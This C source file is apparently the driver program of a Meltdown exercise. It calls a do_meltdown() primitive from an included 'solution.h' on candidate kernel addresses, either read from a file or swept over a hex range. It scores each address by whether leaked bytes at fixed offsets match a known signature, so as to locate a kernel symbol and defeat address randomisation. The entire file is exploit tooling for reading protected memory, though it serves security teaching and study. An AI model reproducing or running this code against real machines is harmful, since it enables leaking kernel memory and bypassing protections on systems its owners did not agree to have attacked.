#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "solution.h"

#define SIG_OFFSET1 65
#define SIG_OFFSET2 66
#define SIG_BYTE1   'p'
#define SIG_BYTE2   'c'

static int parse_hex(const char *s, uintptr_t *out) {
    char *end = NULL;
    unsigned long long v = strtoull(s, &end, 16);
    if (s == end || *end != '\0') {
        return -1;
    }
    *out = (uintptr_t)v;
    return 0;
}

static int score_candidate(uintptr_t addr, int rounds) {
    int score = 0;
    for (int r = 0; r < rounds; r++) {
        int v1 = do_meltdown(addr + SIG_OFFSET1);
        int v2 = do_meltdown(addr + SIG_OFFSET2);
        if (v1 == SIG_BYTE1 && v2 == SIG_BYTE2) {
            score++;
        }
    }
    return score;
}

static int run_candidates_file(const char *path, int rounds) {
    FILE *f = fopen(path, "r");
    if (!f) {
        fprintf(stderr, "Failed to open candidates file: %s\n", path);
        return EXIT_FAILURE;
    }

    uintptr_t best_addr = 0;
    int best_score = -1;

    char line[256];
    while (fgets(line, sizeof(line), f)) {
        char *nl = strchr(line, '\n');
        if (nl) {
            *nl = '\0';
        }
        if (line[0] == '\0') {
            continue;
        }

        uintptr_t addr = 0;
        if (parse_hex(line, &addr) != 0) {
            continue;
        }

        int score = score_candidate(addr, rounds);
        printf("0x%lx %d\n", (unsigned long)addr, score);

        if (score > best_score) {
            best_score = score;
            best_addr = addr;
        }
    }

    fclose(f);
    fprintf(stderr, "Best candidate: 0x%lx (score=%d)\n",
            (unsigned long)best_addr, best_score);
    return EXIT_SUCCESS;
}

static int run_range(const char *start_s, const char *end_s, const char *step_s,
                     const char *offset_s, int rounds) {
    uintptr_t start = 0, end = 0, step = 0, offset = 0;
    if (parse_hex(start_s, &start) != 0 || parse_hex(end_s, &end) != 0 ||
        parse_hex(step_s, &step) != 0 || parse_hex(offset_s, &offset) != 0 ||
        step == 0) {
        fprintf(stderr, "Invalid range arguments\n");
        return EXIT_FAILURE;
    }

    uintptr_t best_addr = 0;
    int best_score = -1;

    for (uintptr_t base = start; base <= end; base += step) {
        uintptr_t addr = base + offset;
        int score = score_candidate(addr, rounds);
        printf("0x%lx %d\n", (unsigned long)addr, score);
        if (score > best_score) {
            best_score = score;
            best_addr = addr;
        }
    }

    fprintf(stderr, "Best candidate: 0x%lx (score=%d)\n",
            (unsigned long)best_addr, best_score);
    return EXIT_SUCCESS;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr,
                "Usage:\n"
                "  %s <candidates.txt> <rounds>\n"
                "  %s --range <base_start> <base_end> <step> <symbol_offset> <rounds>\n",
                argv[0], argv[0]);
        return EXIT_FAILURE;
    }

    cc_init();

    if (strcmp(argv[1], "--range") == 0) {
        if (argc < 7) {
            fprintf(stderr, "Invalid --range args\n");
            return EXIT_FAILURE;
        }
        int rounds = atoi(argv[6]);
        if (rounds <= 0) {
            fprintf(stderr, "Invalid rounds\n");
            return EXIT_FAILURE;
        }
        return run_range(argv[2], argv[3], argv[4], argv[5], rounds);
    }

    int rounds = atoi(argv[2]);
    if (rounds <= 0) {
        fprintf(stderr, "Invalid rounds\n");
        return EXIT_FAILURE;
    }

    return run_candidates_file(argv[1], rounds);
}
